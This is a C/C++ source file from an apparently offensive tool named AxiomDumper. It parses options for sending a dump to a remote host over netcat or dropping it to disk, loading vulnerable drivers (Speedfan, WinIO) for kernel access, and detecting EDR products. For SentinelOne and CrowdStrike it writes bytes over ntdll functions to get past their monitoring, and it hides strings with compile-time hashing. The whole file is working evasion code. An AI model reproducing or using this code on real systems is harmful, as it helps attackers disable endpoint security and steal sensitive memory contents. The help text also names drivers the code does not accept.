#include "AxiomDumper.h"
#include "dm.h"
#include "autoxor.h"
#include "compiletime_md5.hpp"
#include "utils.h"

BOOL CORE_parse_args(int argc, char **argv)
{
	int i;
	BOOL kernelBaseCustom = FALSE;

	i = 1;
	g_options->mode = ModeInvalid;
	g_options->driver = DriverInvalid;
	g_options->rhost = NULL;
	g_options->rport = 0;
	g_options->savepath = NULL;
	g_options->autoload_mode = AutoloadModeInvalid;
	g_options->drv_name = NULL;
	g_options->taskuser = NULL;
	g_options->taskpassword = NULL;
	g_options->patchAddress = 0x00;
	g_options->edrProfile = UTILS_DetectEdr();
	while (i < argc)
	{
		printf("[+] Processing argument: %s\n", argv[i]);
		if (STEALTH_CHECK_STR_EQUALS("/mode:", argv[i]))
		{
			constexpr size_t arglen = constexpr_strlen("/mode:");
			if (STEALTH_CHECK_STR_EQUALS("netcat", argv[i] + arglen))
				g_options->mode = ModeNetcat;
			else if (STEALTH_CHECK_STR_EQUALS("dropfile", argv[i] + arglen))
				g_options->mode = ModeDropfile;
			else if (STEALTH_CHECK_STR_EQUALS("get-kernel-base", argv[i] + arglen)) {
				g_options->mode = ModeFindKernelBase;
				return (TRUE);
			}
			else {
				printf("[!] Unrecognized /mode: argument: %s\n", argv[i] + arglen);
				return (FALSE);
			}
		}

		else if (STEALTH_CHECK_STR_EQUALS("/rhost:", argv[i]))
		{
			constexpr size_t arglen = constexpr_strlen("/rhost:");
			g_options->rhost = drunk_strdup(argv[i] + arglen);
		}

		else if (STEALTH_CHECK_STR_EQUALS("/rport:", argv[i]))
		{
			constexpr size_t arglen = constexpr_strlen("/rport:");
			g_options->rport = drunk_atoi(argv[i] + arglen);
		}

		else if (STEALTH_CHECK_STR_EQUALS("/savepath:", argv[i]))
		{
			constexpr size_t arglen = constexpr_strlen("/savepath:");
			g_options->savepath = drunk_strdup(argv[i] + arglen);
		}

		else if (STEALTH_CHECK_STR_EQUALS("/autoload:", argv[i]))
		{
			constexpr size_t arglen = constexpr_strlen("/autoload:");
			if (STEALTH_CHECK_STR_EQUALS("no", argv[i] + arglen))
				g_options->autoload_mode = AutoloadModeDisabled;
			else if (STEALTH_CHECK_STR_EQUALS("proxy", argv[i] + arglen))
				g_options->autoload_mode = AutoloadModeProxy;
			else if (STEALTH_CHECK_STR_EQUALS("reflective", argv[i] + arglen))
				g_options->autoload_mode = AutoloadReflective;
			else {
				printf("[!] Invalid autoload mode\n");
				return (FALSE);
			}
		}

		else if (STEALTH_CHECK_STR_EQUALS("/driver:", argv[i]))
		{
			constexpr size_t arglen = constexpr_strlen("/driver:");
			if (STEALTH_CHECK_STR_EQUALS("speedfan", argv[i] + arglen))
				g_options->driver = DriverSpeedfan;
			else if (STEALTH_CHECK_STR_EQUALS("winio", argv[i] + arglen))
				g_options->driver = DriverWinIO;
			else {
				printf("[!] Invalid driver selected: %s\n", argv[i] + arglen);
				return (FALSE);
			}
		}

		else if (STEALTH_CHECK_STR_EQUALS("/taskuser:", argv[i]))
		{
			constexpr size_t arglen = constexpr_strlen("/taskuser:");
			g_options->taskuser = drunk_strdup(argv[i] + arglen);
		}

		else if (STEALTH_CHECK_STR_EQUALS("/taskpassword:", argv[i]))
		{
			constexpr size_t arglen = constexpr_strlen("/taskpassword:");
			g_options->taskpassword = drunk_strdup(argv[i] + arglen);
		}

		else if (STEALTH_CHECK_STR_EQUALS("/kernelbase:", argv[i]))
		{
			constexpr size_t arglen = constexpr_strlen("/kernelbase:");
			DM_SetNtoskrnlBaseAddress((PVOID)drunk_atoi_hex(argv[i] + arglen));
			kernelBaseCustom = TRUE;
		}

		else if (STEALTH_CHECK_STR_EQUALS("/unload:", argv[i]))
		{
			constexpr size_t arglen = constexpr_strlen("/unload:");
			g_options->drv_name = drunk_strdup(argv[i] + arglen);
			g_options->mode = ModeUnload;
			return (TRUE);
		}

		else if (STEALTH_CHECK_STR_EQUALS("/help", argv[i]))
		{
			g_options->mode = ModeHelp;
			return (TRUE);
		}

		else {
			printf("[!] Unrecognized option: %s\n", argv[i]);
			return (FALSE);
		}
		i++;
	}

	// Validation
	if (g_options->mode == ModeInvalid || g_options->autoload_mode == AutoloadModeInvalid)
		return (FALSE);
	else if (g_options->mode == ModeNetcat && (g_options->rhost == NULL || g_options->rport == 0))
	{
		printf("[!] Using netcat mode requires /rhost: and /rport: parameters\n");
		return (FALSE);
	}
	else if (g_options->mode == ModeDropfile && g_options->savepath == NULL)
	{
		printf("[!] Using dropfile mode requires /savepath: parameter\n");
		return (FALSE);
	}
	else if (g_options->driver == DriverInvalid)
	{
		printf("[!] You must specifiy a driver with /driver:[winring|lenovo]\n");
		return (FALSE);
	}

	// Population
	if (g_options->autoload_mode == AutoloadReflective) {
		g_options->drv_name = drunk_random_string(6);
	}

	 // EDR profile checking
	if (g_options->edrProfile == EdrSentinelOne)
	{
		if (g_options->mode != ModeFindKernelBase && g_options->mode != ModeHelp && g_options->mode != ModeUnload && kernelBaseCustom == FALSE)
		{
			printf("[!] Kernel base address must be pre-computed with this EDR. Re-run the program with /mode:get-kernel-base and follow instructions\n");
			return (FALSE);
		}
		if (g_options->driver == DriverSpeedfan)
		{
			printf("[!] This driver is detected by Sentinel ONE, use another\n");
			return (FALSE);
		}
		BYTE bufferNt[8] = { 0x4c, 0x8b, 0xd1, 0xb8, 0x07, 0x00, 0x00, 0x00 };
		ULONGLONG queryVirtualMemAddr = UTILS_GetFunctionAddress(compiletime_md5("NtQueryVirtualMemory"));
		WriteProcessMemory(GetCurrentProcess(), (void*)(queryVirtualMemAddr), bufferNt, 8, NULL);
		printf("[+] NtQueryVirtualMemory patched !\n");
	}
	else if (g_options->autoload_mode == AutoloadReflective && (g_options->edrProfile == EdrCortex || g_options->edrProfile == EdrCrowdstrike || g_options->edrProfile == EdrKaspersky))
	{
		printf("[!] Using /autoload:reflective will be detected with this EDR. Drop and load the driver manually with sc.exe, then re-run with /autoload:no\n");
		return (FALSE);
	}
	else if (g_options->edrProfile == EdrMDE)
	{
		printf("[!] Evading this EDR is not yet supported, refusing to run\n");
		return (FALSE);
	}
	else if (g_options->edrProfile == EdrCrowdstrike)
	{
		// NtDeviceIoControlFile must be patched before running against CS
		BYTE bufferNt[8] = { 0x4c, 0x8b, 0xd1, 0xb8, 0x07, 0x00, 0x00, 0x00 };
		constexpr uint64_t deviceIOHash = compiletime_md5("NtDeviceIoControlFile");
		ULONGLONG patchAddress = UTILS_GetFunctionAddress(deviceIOHash);
		WriteProcessMemory(GetCurrentProcess(), (void*)patchAddress, bufferNt, 8, NULL);
		g_options->patchAddress = patchAddress;
		printf("[+] NtDeviceIoControlFile patched !\n");
	}

	return (TRUE);
}

